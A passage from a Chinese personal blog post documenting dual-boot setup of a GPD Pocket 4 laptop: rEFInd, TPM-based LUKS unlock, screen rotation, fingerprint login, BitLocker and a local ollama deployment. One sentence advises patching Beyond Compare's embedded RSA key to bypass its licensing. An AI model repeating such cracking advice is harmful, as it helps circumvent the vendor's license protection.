class="language-bash">关闭WiFi节能，以免待机的时候网掉了</span></span><br><span class="line">iw dev wlan0 get power_save &amp;&amp; iw dev wlan0 set power_save off</span><br><span class="line">cat &lt;&lt; EOF &gt; /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line">[connection]</span><br><span class="line">wifi.powersave = 2</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">外接电源的情况下，盒盖不休眠</span></span><br><span class="line">sed -i &quot;s/^[#]HandleLidSwitchExternalPower=[a-z]\+/HandleLidSwitchExternalPower=ignore/&quot; /etc/systemd/logind.conf ; systemctl restart systemd-logind</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置硬件时钟为本地时间，默认Ubuntu认为其为UTC时间，如果不在0时区的话，会和windows冲突</span></span><br><span class="line">timedatectl set-local-rtc 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>安装beyondcompare的过程忽略，记得strings搜索并修改RSA密钥，改key，注释掉<code>/etc/apt/sources.list.d/scootersoftware.list</code>里的repo。<br>另外注意如果以root权限启动beyondcompare，需要导出<code>QT_GRAPHICSSYSTEM</code>环境变量，比如<code>sudo QT_GRAPHICSSYSTEM=native bcompare</code></p>
<h3 id="grub配置"><a href="#grub配置" class="headerlink" title="grub配置"></a>grub配置</h3><p>修改默认配置，以下参数改成对应的值（rEFInd安装时会继承部分grub参数）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB_DEFAULT=0</span><br><span class="line">GRUB_TIMEOUT=2</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;net.ifnames=0 biosdevname=0 quiet splash&quot;       # 旧版网卡名(如eth0，wlan0)</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;video=efifb:panel_orientation=right_side_up video=eDP-1:panel_orientation=right_side_up fbcon=rotate:1 fbcon=rotate_all:1&quot;  # 和屏幕旋转有关，磁盘解密后会自动旋转过来。</span><br><span class="line"># GRUB_GFXMODE=1600x2560x32    # 先注释掉</span><br><span class="line"># GRUB_GFXPAYLOAD_LINUX=keep   # 先注释掉</span><br></pre></td></tr></table></figure>
<p>改完记得<code>update-grub2</code>。</p>
<h3 id="rEFInd安装"><a href="#rEFInd安装" class="headerlink" title="rEFInd安装"></a>rEFInd安装</h3><p>shell <code>apt install -y refind</code>，可以考虑更新 repo 到官方最新版(<code>add-apt-repository ppa:rodsmith/refind &amp;&amp; apt update</code>)，配置和主题直接从pocket3复制过来，也可以参考<span class="exturl" data-url="aHR0cHM6Ly91YnVudHVoYW5kYm9vay5vcmcvaW5kZXgucGhwLzIwMjMvMTIvc2V0dXAtcmVmaW5kLWJvb3QtbWFuYWdlci11YnVudHUv" title="https://ubuntuhandbook.org/index.php/2023/12/setup-refind-boot-manager-ubuntu/">这个链接<i class="fa fa-external-link"></i></span>，最后执行<code>refind-install &amp;&amp; refind-mkdefault</code>。因为屏幕实际是竖屏不能改rEFInd方向，所以win和ubuntu的logo是竖着排列的，如下图。</p>
<img src="/2025/02/16/2025-02-16/rEFInd_ui.jpg" class="">

<p>修改Windows默认引导方式，关于rEFInd &amp; BitLocker 自动解密，除了上述Windows配置禁用PCR7以外，可以使用如下firmware_bootnum为对应的值（本机环境04）来设置windows启动（<span class="exturl" data-url="aHR0cHM6Ly93d3cucm9kc2Jvb2tzLmNvbS9yZWZpbmQvY29uZmlnZmlsZS5odG1sI2Jvb3RuZXh0" title="https://www.rodsbooks.com/refind/configfile.html#bootnext">参考链接<i class="fa fa-external-link"></i></span>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat /boot/efi/EFI/refind/refind.conf</span><br><span class="line">...</span><br><span class="line">menuentry &quot;Windows&quot; &#123;</span><br><span class="line">    icon /EFI/refind/themes/refind-ambience-black/icons/os_win8.png</span><br><span class="line">    firmware_bootnum 04</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样配置后，Windows引导时refind会先设置BootNext为<code>efibootmgr</code>中对应的UEFI引导（本机4号引导为Windows自己的引导），再重启，重启后会临时使用Windows安装的UEFI引导来进入系统（启动链是微软自己的，不破坏各种证书签名）。<br>用BootNext的方式，Windows 组策略可以不配置“<code>为本地UEFI固件配置配置TPM平台验证配置文件</code>”选项。<br>另外，引导界面Windows系统右上角的小Logo，可以通过将refind图标目录下的transparent.png覆盖vol_efi.png实现关闭。<br>有时候Windows更新后会调整BootManager，如果rEFInd进不了Windows，需要在Ubuntu下<code>efibootmgr</code>看看Windows具体的BootNum再修改配置文件。</p>
<p>当前环境的rEFInd完整的有效配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@pocket:~# cat /boot/efi/EFI/refind/refind.conf | grep -Ev &quot;^(#|\s*$)&quot;</span><br><span class="line">timeout 5</span><br><span class="line">use_nvram false</span><br><span class="line">hideui singleuser,hints,arrows,label,badges</span><br><span class="line">banner digital.png</span><br><span class="line">banner_scale fillscreen</span><br><span class="line">small_icon_size 96</span><br><span class="line">resolution 1600 2560</span><br><span class="line">use_graphics_for linux,windows,osx</span><br><span class="line">scanfor manual,internal</span><br><span class="line">dont_scan_dirs + EFI/Boot,EFI/ubuntu,EFI/Microsoft,EFI/Microsoft/Boot</span><br><span class="line">scan_all_linux_kernels true</span><br><span class="line">fold_linux_kernels true</span><br><span class="line">write_systemd_vars false</span><br><span class="line">default_selection 1</span><br><span class="line">menuentry &quot;Windows&quot; &#123;</span><br><span class="line">    icon /EFI/refind/themes/refind-ambience-black/icons/os_win8.png</span><br><span class="line">    firmware_bootnum 00</span><br><span class="line">    #disabled</span><br><span class="line">&#125;</span><br><span class="line">include themes/refind-ambience-black/theme.conf</span><br></pre></td></tr></table></figure>
<p>另外补充一下rEFInd继承自grub的启动配置参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这里是rEFInd初始化时继承自grub的参数，也可以在这直接改</span><br><span class="line">root@pocket:~# cat /boot/refind_linux.conf</span><br><span class="line">&quot;Boot with standard options&quot;  &quot;root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0 video=efifb:panel_orientation=right_side_up video=eDP-1:panel_orientation=right_side_up fbcon=rotate:1 fbcon=rotate_all:1 quiet splash crashkernel=2G-4G:320M,4G-32G:512M,32G-64G:1024M,64G-128G:2048M,128G-:4096M vt.handoff=7&quot;</span><br><span class="line">&quot;Boot to single-user mode&quot;    &quot;root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0 video=efifb:panel_orientation=right_side_up video=eDP-1:panel_orientation=right_side_up fbcon=rotate:1 fbcon=rotate_all:1 quiet splash crashkernel=2G-4G:320M,4G-32G:512M,32G-64G:1024M,64G-128G:2048M,128G-:4096M vt.handoff=7 single&quot;</span><br><span class="line">&quot;Boot with minimal options&quot;   &quot;ro root=/dev/mapper/ubuntu--vg-ubuntu--lv&quot;</span><br></pre></td></tr></table></figure>
<h3 id="关闭内存交换"><a href="#关闭内存交换" class="headerlink" title="关闭内存交换"></a>关闭内存交换</h3><p>p4这个机器内存比较大，暂时用不着swap，把<code>/etc/fstab</code>里的swap注释掉：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## disable default swap</span><br><span class="line">##/swap.img none    swap    sw  0   0</span><br></pre></td></tr></table></figure>
<p>重启后删除 <code>/swap.img</code> 。</p>
<h3 id="TPM-启动时自动解密磁盘配置"><a href="#TPM-启动时自动解密磁盘配置" class="headerlink" title="TPM 启动时自动解密磁盘配置"></a>TPM 启动时自动解密磁盘配置</h3><p>设置基于TPM的磁盘自动解密，实现不用每次进Ubuntu都输入磁盘密码（<span class="exturl" data-url="aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xNDcwMzkxL2x1a3MtdHBtMi1hdXRvLXVubG9jay1hdC1ib290LXN5c3RlbWQtY3J5cHRlbnJvbGw=" title="https://askubuntu.com/questions/1470391/luks-tpm2-auto-unlock-at-boot-systemd-cryptenroll">参考链接<i class="fa fa-external-link"></i></span>），目前磁盘的分区结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@pocket:~# fdisk -l /dev/nvme0n1</span><br><span class="line">Disk /dev/nvme0n1：1.82 TiB，2000398934016 字节，3907029168 个扇区</span><br><span class="line">Disk model: WD Blue SN580 2TB</span><br><span class="line">单元：扇区 / 1 * 512 = 512 字节</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：gpt</span><br><span class="line">磁盘标识符：********-****-****-****-************</span><br><span class="line"></span><br><span class="line">设备                 起点       末尾       扇区   大小 类型</span><br><span class="line">/dev/nvme0n1p1       2048     206847     204800   100M EFI 系统</span><br><span class="line">/dev/nvme0n1p2     206848     468991     262144   128M Microsoft 保留</span><br><span class="line">/dev/nvme0n1p3     468992  629614591  629145600   300G Microsoft 基本数据</span><br><span class="line">/dev/nvme0n1p4  629614592 1936989179 1307374588 623.4G Microsoft 基本数据</span><br><span class="line">/dev/nvme0n1p5 3873474560 3907028991   33554432    16G Windows 恢复环境</span><br><span class="line">/dev/nvme0n1p6 1936990208 1941184511    4194304     2G Linux 文件系统</span><br><span class="line">/dev/nvme0n1p7 1941184512 3873474559 1932290048 921.4G Linux 文件系统</span><br></pre></td></tr></table></figure>
<p>参考这个分区信息配置Ubuntu磁盘解密：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TPM自动解密磁盘，注意使用前修改并核对 /dev/nvme 分区号</span></span><br><span class="line">mkdir -p /root/installers</span><br><span class="line">cat &lt;&lt; EOF &gt; /root/installers/ubuntu_auto_unlock_decrypt_encrypted_disk.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ref: https://askubuntu.com/questions/1470391/luks-tpm2-auto-unlock-at-boot-systemd-cryptenroll</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is what I<span class="string">&#x27;m using to allow LUKS decryption using TPM2 in the same Ubuntu 22.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Not using systemd-cryptenroll, but clevis.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">The only &#x27;</span>downside<span class="string">&#x27; is that it shows the password prompt at boot, but disappears after getting the key from tpm.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># No need to modify anything else(not even crypttab file).</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Update: also tested and working with Ubuntu 24.04 LTS; change device nvme0n1p3 to whatever suits your system.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Update 2: Tested and works on Debian 12 as well.</span></span></span><br><span class="line"></span><br><span class="line">export TARGET_DISK=&quot;/dev/nvme0n1p7&quot;     # pocket4 in 2025/01/24，注意使用前修改并核对 /dev/nvme 分区号</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">install needed packages</span></span></span><br><span class="line">apt-get -y install clevis clevis-tpm2 clevis-luks clevis-initramfs initramfs-tools tss2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">proceed</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">这里需要输入磁盘的解密密码，以便绑上TPM</span></span></span><br><span class="line">echo -n Enter LUKS password:</span><br><span class="line">read -s LUKSKEY</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">clevis luks bind -d \$TARGET_DISK tpm2 &#x27;&#123;&quot;pcr_bank&quot;:&quot;sha256&quot;&#125;&#x27; &lt;&lt;&lt; &quot;\$LUKSKEY&quot;</span><br><span class="line">update-initramfs -u -k all</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">check</span></span></span><br><span class="line">clevis luks list -d \$TARGET_DISK       # pocket4 in 20250124，注意使用前修改并核对 /dev/nvme 分区号</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">delete example; -s is one of the slots reported by the previous command</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">clevis luks unbind -d \$TARGET_DISK -s 1 tpm2</span></span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo /root/installers/ubuntu_auto_unlock_decrypt_encrypted_disk.sh</span><br></pre></td></tr></table></figure>
<h3 id="在磁盘解密界面，开始的时候屏幕的方向不对，找了好几种方法试了试，也不知道哪种最后生效的，都记录一下："><a href="#在磁盘解密界面，开始的时候屏幕的方向不对，找了好几种方法试了试，也不知道哪种最后生效的，都记录一下：" class="headerlink" title="在磁盘解密界面，开始的时候屏幕的方向不对，找了好几种方法试了试，也不知道哪种最后生效的，都记录一下："></a>在磁盘解密界面，开始的时候屏幕的方向不对，找了好几种方法试了试，也不知道哪种最后生效的，都记录一下：</h3><p>部分参考了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpbXB5c3dvcmxkL3VtcGMtdWJ1bnR1" title="https://github.com/wimpysworld/umpc-ubuntu">这个项目<i class="fa fa-external-link"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /usr/share/X11/xorg.conf.d/40-gpd-pocket4-monitor.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">custom add and modified from old pocket3</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GPD Pocket 4 (modesetting)</span></span><br><span class="line">Section &quot;Monitor&quot;</span><br><span class="line">    Identifier &quot;eDP-1&quot; # name changed from p3 DSI-1</span><br><span class="line">    Option     &quot;Rotate&quot;  &quot;right&quot;</span><br><span class="line">EndSection</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GPD Pocket 4 (xorg-video)</span></span><br><span class="line">Section &quot;Monitor&quot;</span><br><span class="line">    Identifier &quot;eDP1&quot; # name changed from p3 DSI1</span><br><span class="line">    Option     &quot;Rotate&quot;  &quot;right&quot;</span><br><span class="line">EndSection</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; EOF &gt; /var/lib/gdm3/.config/monitors.xml</span><br><span class="line">&lt;monitors version=&quot;2&quot;&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">    &lt;logicalmonitor&gt;</span><br><span class="line">      &lt;x&gt;0&lt;/x&gt;</span><br><span class="line">      &lt;y&gt;0&lt;/y&gt;</span><br><span class="line">      &lt;scale&gt;2&lt;/scale&gt;</span><br><span class="line">      &lt;primary&gt;yes&lt;/primary&gt;</span><br><span class="line">      &lt;transform&gt;</span><br><span class="line">        &lt;rotation&gt;right&lt;/rotation&gt;</span><br><span class="line">        &lt;flipped&gt;no&lt;/flipped&gt;</span><br><span class="line">      &lt;/transform&gt;</span><br><span class="line">      &lt;monitor&gt;</span><br><span class="line">        &lt;monitorspec&gt;</span><br><span class="line">          &lt;connector&gt;eDP-1&lt;/connector&gt;</span><br><span class="line">          &lt;vendor&gt;unknown&lt;/vendor&gt;</span><br><span class="line">          &lt;product&gt;unknown&lt;/product&gt;</span><br><span class="line">          &lt;serial&gt;unknown&lt;/serial&gt;</span><br><span class="line">        &lt;/monitorspec&gt;</span><br><span class="line">        &lt;mode&gt;</span><br><span class="line">          &lt;width&gt;1600&lt;/width&gt;</span><br><span class="line">          &lt;height&gt;2560&lt;/height&gt;</span><br><span class="line">          &lt;rate&gt;143.999&lt;/rate&gt;</span><br><span class="line">        &lt;/mode&gt;</span><br><span class="line">      &lt;/monitor&gt;</span><br><span class="line">    &lt;/logicalmonitor&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;/monitors&gt;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; EOF &gt; /home/$USERNAME/.config/monitors.xml</span><br><span class="line">&lt;monitors version=&quot;2&quot;&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">    &lt;layoutmode&gt;physical&lt;/layoutmode&gt;</span><br><span class="line">    &lt;logicalmonitor&gt;</span><br><span class="line">      &lt;x&gt;0&lt;/x&gt;</span><br><span class="line">      &lt;y&gt;0&lt;/y&gt;</span><br><span class="line">      &lt;scale&gt;2&lt;/scale&gt;</span><br><span class="line">      &lt;primary&gt;yes&lt;/primary&gt;</span><br><span class="line">      &lt;monitor&gt;</span><br><span class="line">        &lt;monitorspec&gt;</span><br><span class="line">          &lt;connector&gt;eDP-1&lt;/connector&gt;</span><br><span class="line">          &lt;vendor&gt;HSX&lt;/vendor&gt;</span><br><span class="line">          &lt;product&gt;YHB03P24&lt;/product&gt;</span><br><span class="line">          &lt;serial&gt;0x00888888&lt;/serial&gt;</span><br><span class="line">        &lt;/monitorspec&gt;</span><br><span class="line">        &lt;mode&gt;</span><br><span class="line">          &lt;width&gt;2560&lt;/width&gt;</span><br><span class="line">          &lt;height&gt;1600&lt;/height&gt;</span><br><span class="line">          &lt;rate&gt;143.999&lt;/rate&gt;</span><br><span class="line">        &lt;/mode&gt;</span><br><span class="line">      &lt;/monitor&gt;</span><br><span class="line">    &lt;/logicalmonitor&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;/monitors&gt;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">udevadm control --reload-rules</span><br><span class="line">udevadm trigger</span><br></pre></td></tr></table></figure>
<p>其中显示器设备名从gpd-pocket3原来的DSI-1变成了eDP-1了（和壹号本3pro好像一样），在本地图形界面打开的用户权限终端里，可以用 <code>xrandr --query</code> 查看屏幕的详细信息。</p>
<h3 id="Ubuntu下指纹识别配置"><a href="#Ubuntu下指纹识别配置" class="headerlink" title="Ubuntu下指纹识别配置"></a>Ubuntu下指纹识别配置</h3><p>本来以为一如既往的<span class="exturl" data-url="aHR0cHM6Ly9saW51eC1oYXJkd2FyZS5vcmcvP2lkPXVzYjoyODA4LTA3NTI=" title="https://linux-hardware.org/?id=usb:2808-0752">指纹模块不兼容Linux<i class="fa fa-external-link"></i></span>，不过从<span class="exturl" data-url="aHR0cHM6Ly9zb2Z0d2luY24uY29tL2dwZHBvY2tldDRnanh6" title="https://softwincn.com/gpdpocket4gjxz">官网BIOS驱动包链接<i class="fa fa-external-link"></i></span>的引用找到<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z0ZnB0ZWFtcy9mb2NhbHRlY2gtbGludXgtZmluZ2VycHJpbnQtZHJpdmVy" title="https://github.com/ftfpteams/focaltech-linux-fingerprint-driver">这里<i class="fa fa-external-link"></i></span>看，貌似22.04版已经支持了Ubuntu指纹，这里试了下24.10，最终也可以刷指纹登录了，方法如下。</p>
<p><strong>软件安装</strong>：</p>
<ul>
<li>下载<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z0ZnB0ZWFtcy9mb2NhbHRlY2gtbGludXgtZmluZ2VycHJpbnQtZHJpdmVyL3Jhdy9yZWZzL2hlYWRzL21haW4vVWJ1bnR1X0RlYmlhbi94ODYvbGliZnByaW50LTItMl8xLjk0LjQrdG9kMS0wdWJ1bnR1MX4yMi4wNC4yX2FtZDY0XzIwMjUwMjE5LmRlYg==" title="https://github.com/ftfpteams/focaltech-linux-fingerprint-driver/raw/refs/heads/main/Ubuntu_Debian/x86/libfprint-2-2_1.94.4+tod1-0ubuntu1~22.04.2_amd64_20250219.deb">第三方libfprint程序<i class="fa fa-external-link"></i></span>（找最新版）。</li>
<li>下载文件对应目录，执行<code>dpkg -c libfprint-2-2_1.94.4+tod1-0ubuntu1~22.04.2_amd64_20250219.deb</code>可以先看一下将会安装哪些文件。</li>
<li>执行<code>sudo dpkg -i ./libfprint-2-2_1.94.4+tod1-0ubuntu1~22.04.2_amd64_20250219.deb</code>进行安装。</li>
<li>执行<code>sudo apt install -yfprintd libfprint-2-2 libpam-fprintd</code>安装其他配套程序。</li>
<li>执行<code>sudo pam-auth-update</code>开启pam认证配置程序，勾选<strong>Fingerprint authentication</strong>，确定。</li>
</ul>
<p><strong>命令行方式添加指纹</strong>：</p>
<ul>
<li>执行<code>sudo fprintd-enroll [USERNAME]</code>为对应USERNAME的用户设置指纹，按照提示在指纹传感器上多次刷对应的手指。</li>
</ul>
<p><strong>图形界面方式添加指纹</strong>：</p>
<ul>
<li>复制<code>/usr/share/polkit-1/rules.d/50-default.rules</code>到<code>/etc/polkit-1/rules.d/</code>，检查一下当前用户在sudo组，重启电脑。</li>
<li>“设置”-&gt;“系统”-&gt;“用户”-&gt;“指纹登录”，进行指纹添加。</li>
</ul>
<img src="/2025/02/16/2025-02-16/user_fprint.jpg" class="">
<img src="/2025/02/16/2025-02-16/user_fprint2.jpg" class="">

<p>补充说明（踩坑记录）：<br>装完软件不改polkit配置时，图形界面“设置”-&gt;“系统”-&gt;“用户”-&gt;“指纹登录”中添加指纹会没有响应，命令行下用户权限enroll的时候也会报未认证错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@pocket:~$ fprintd-enroll</span><br><span class="line">Using device /net/reactivated/Fprint/Device/0</span><br><span class="line">failed to claim device: GDBus.Error:net.reactivated.Fprint.Error.PermissionDenied: Not Authorized: net.reactivated.fprint.device.enroll</span><br></pre></td></tr></table></figure>
<p>参考<span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kZWJpYW4uYnVncy5kaXN0Lm5hcmtpdmUuY29tL3pDVnBNUWdKL2J1Zy05ODI5MDItZnByaW50ZC1lbnJvbGwtbm90LWF1dGhvcml6ZWQ=" title="https://linux.debian.bugs.dist.narkive.com/zCVpMQgJ/bug-982902-fprintd-enroll-not-authorized">这个bugzilla记录<i class="fa fa-external-link"></i></span>，怀疑是权限安全考虑，按照描述查了一下polkitd服务貌似正常运行着，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL2xpYmZwcmludC9mcHJpbnRkLy0vYmxvYi9tYXN0ZXIvZGF0YS9uZXQucmVhY3RpdmF0ZWQuZnByaW50LmRldmljZS5wb2xpY3kuaW4jTDIyLTMw" title="https://gitlab.freedesktop.org/libfprint/fprintd/-/blob/master/data/net.reactivated.fprint.device.policy.in#L22-30">这个链接<i class="fa fa-external-link"></i></span>查看<code>/usr/share/polkit-1/actions/net.reactivated.fprint.device.policy</code>配置文件，内容貌似也正常。<br>此时可以在root权限执行<code>fprintd-enroll USERNAME</code>以高权限注册用户的指纹，不影响认证（如上“命令行方式添加指纹”）。<br>参考<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvRnByaW50I0ZpbmdlcnByaW50X2F1dGhlbnRpY2F0aW9uX2lzX25vdF90YWtpbmdfZWZmZWN0X2luX3RoZV9Qb2xraXRfYWdlbnQu" title="https://wiki.archlinux.org/title/Fprint#Fingerprint_authentication_is_not_taking_effect_in_the_Polkit_agent.">这里<i class="fa fa-external-link"></i></span>，为polkit添加配置策略后解决问题（如上“图形界面方式添加指纹”）。</p>
<h3 id="安装amdgpu-top"><a href="#安装amdgpu-top" class="headerlink" title="安装amdgpu_top"></a>安装amdgpu_top</h3><p><strong>amdgpu_top</strong> 有点像l4t上的jtop，可以查看按摩店gpu的占用，后面跑大模型可以看是不是在gpu上跑的，以及负载情况。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/installers</span><br><span class="line">cd ~/installers</span><br><span class="line">git clone https://github.com/Umio-Yasuno/amdgpu_top</span><br><span class="line">cd amdgpu_top &amp;&amp; git checkout v0.10.1</span><br><span class="line">sudo apt install cargo &amp;&amp; cargo install --locked amdgpu_top &amp;&amp; sudo cp ~/.cargo/bin/amdgpu_top /usr/local/bin/amdgpu_top</span><br></pre></td></tr></table></figure>
<h1 id="Windows-BitLocker-磁盘加密，配置安全启动"><a href="#Windows-BitLocker-磁盘加密，配置安全启动" class="headerlink" title="Windows BitLocker 磁盘加密，配置安全启动"></a>Windows BitLocker 磁盘加密，配置安全启动</h1><h2 id="打开BitLocker设置"><a href="#打开BitLocker设置" class="headerlink" title="打开BitLocker设置"></a>打开BitLocker设置</h2><p>回到Windows系统，设置-&gt;隐私和安全性-&gt;设备加密，系统盘打开BitLocker，数据盘也打开BitLocker，找个U盘或者NAS备份一下解密用的key，然后也配置一下自动解密。</p>
<h2 id="检查硬件安全配置"><a href="#检查硬件安全配置" class="headerlink" title="检查硬件安全配置"></a>检查硬件安全配置</h2><p>设置-&gt;隐私和安全性-&gt;Windows安全中心-&gt;设备安全性，把可以配置的一些安全选项都配置一下。Secured-core PC的安全细节里好像有bug，固件保护实际是打开的，但显示的是未打开。</p>
<img src="/2025/02/16/2025-02-16/firmware_protection.jpg" class="">

<h2 id="系统盘还原点打开"><a href="#系统盘还原点打开" class="headerlink" title="系统盘还原点打开"></a>系统盘还原点打开</h2><p>设置-&gt;系统-&gt;系统信息-&gt;系统保护（设备规格栏），在系统驱动器上启用保护，配置里分配合适的大小即可（我这里最大使用量分配了30G，占系统盘总空间的10%）。</p>
<h1 id="Windows各种程序安装"><a href="#Windows各种程序安装" class="headerlink" title="Windows各种程序安装"></a>Windows各种程序安装</h1><p>控制面板里把onedrive卸载了，BitLocker设置好之后可以装各种应用了（这样的顺序会让BitLocker初始化的速度快一点），目前安装的一些应用（仅列出部分）：</p>
<h2 id="控制面板："><a href="#控制面板：" class="headerlink" title="控制面板："></a>控制面板：</h2><ul>
<li>3DMark</li>
<li>7-Zip</li>
<li>AMD Chipset Software</li>
<li>AMD Software</li>
<li>API Monitor v2</li>
<li>Beyond Compare</li>
<li>DbGate</li>
<li>Everything</li>
<li>Google Chrome</li>
<li>GPDKeyboardAssistantTool</li>
<li>HashTab</li>
<li>HDMI IN</li>
<li>Microsoft Visual Studio Code</li>
<li>MiniLPA</li>
<li>MotionAssistant</li>
<li>Nmap</li>
<li>NVIDIA PhysX System Software</li>
<li>OBS Studio</li>
<li>Picasa 3</li>
<li>PotPlayer-64 bit</li>
<li>Recuva</li>
<li>RivaTuner Statistics Server</li>
<li>Sandboxie-Plus</li>
<li>SideQuest</li>
<li>Steam</li>
<li>SumatraPDF</li>
<li>Typora</li>
<li>USBPcap</li>
<li>Vim</li>
<li>WinRAR</li>
<li>Wireshark</li>
<li>分区助手</li>
<li>火绒安全软件</li>
<li>微信</li>
<li>远程桌面连接</li>
</ul>
<h2 id="Microsoft-Store"><a href="#Microsoft-Store" class="headerlink" title="Microsoft Store"></a>Microsoft Store</h2><ul>
<li>English (United States) Local Experience Pack</li>
<li>HEIF Image Extension</li>
<li>HEVC Video Extensions from Device Manufacturer</li>
<li>Microsoft 365 Copilot</li>
<li>Microsoft Bing</li>
<li>Microsoft Clipchamp</li>
<li>Microsoft Copilot</li>
<li>…</li>
<li>Microsoft Xiaoxiao (Natural) - Chinese (Simplified, China)</li>
<li>MPEG-2 Video Extension</li>
<li>Phone Link</li>
<li>Raw Image Extension</li>
<li>Speech Pack - Chinese (Simplified)</li>
<li>Speech Pack - English (United States)</li>
<li>Ubuntu</li>
<li>Windows Camera</li>
<li>Windows Subsystem for Linux</li>
<li>Windows Terminal</li>
</ul>
<h1 id="番外：未曾设想的道路之UMPC跑大模型（Deepseek-R1-qwen32b-distill）"><a href="#番外：未曾设想的道路之UMPC跑大模型（Deepseek-R1-qwen32b-distill）" class="headerlink" title="番外：未曾设想的道路之UMPC跑大模型（Deepseek-R1-qwen32b-distill）"></a>番外：未曾设想的道路之UMPC跑大模型（Deepseek-R1-qwen32b-distill）</h1><h2 id="Ubuntu下docker部署："><a href="#Ubuntu下docker部署：" class="headerlink" title="Ubuntu下docker部署："></a>Ubuntu下docker部署：</h2><p>参考 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wZW4td2VidWkvb3Blbi13ZWJ1aQ==" title="https://github.com/open-webui/open-webui">open-webui<i class="fa fa-external-link"></i></span> 的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wZW4td2VidWkvb3Blbi13ZWJ1aS9ibG9iL21haW4vZG9ja2VyLWNvbXBvc2UuYW1kZ3B1LnlhbWw=" title="https://github.com/open-webui/open-webui/blob/main/docker-compose.amdgpu.yaml">compose.yml<i class="fa fa-external-link"></i></span> 文件，添加环境变量 <code>HSA_OVERRIDE_GFX_VERSION=11.0.2</code> 后成功使用GPU进行推理，具体命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">refer1 https://github.com/open-webui/open-webui/blob/main/docker-compose.amdgpu.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">refer2 https://github.com/ollama/ollama/blob/main/docs/gpu.md#overrides-on-linux</span></span><br><span class="line">docker run -dit --name ollama \</span><br><span class="line">    --device /dev/kfd --device /dev/dri \</span><br><span class="line">    -e HSA_OVERRIDE_GFX_VERSION=11.0.2 \</span><br><span class="line">    -p 11434:11434 \</span><br><span class="line">    -v /PATH_TO_YOUR_MODEL_DIR:/root/.ollama \</span><br><span class="line">    ollama/ollama:0.5.11-rocm</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Now you can run a model:</span></span></span><br><span class="line">docker exec -it ollama ollama run 